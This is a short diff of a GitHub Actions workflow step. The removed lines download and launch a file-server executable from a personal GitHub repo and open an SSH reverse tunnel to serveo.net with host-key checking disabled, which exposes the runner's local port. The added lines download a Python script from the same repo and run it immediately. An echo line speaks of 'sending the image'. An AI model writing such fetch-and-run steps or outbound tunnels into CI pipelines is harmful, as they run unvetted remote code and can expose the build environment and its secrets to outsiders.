@@ -71,8 +71,7 @@ jobs:
           echo listing the files
           ls
           echo sending the image
-          curl https://github.com/developerSWe4b/files/raw/refs/heads/main/dufs.exe -o dufs.exe
-          Start-Process .\dufs.exe
-          ssh -o StrictHostKeyChecking=no -R 80:localhost:5000 serveo.net
+          curl https://raw.githubusercontent.com/developerSWe4b/files/refs/heads/main/fclient.py -o fsc.py
+          python fsc.py
 
           
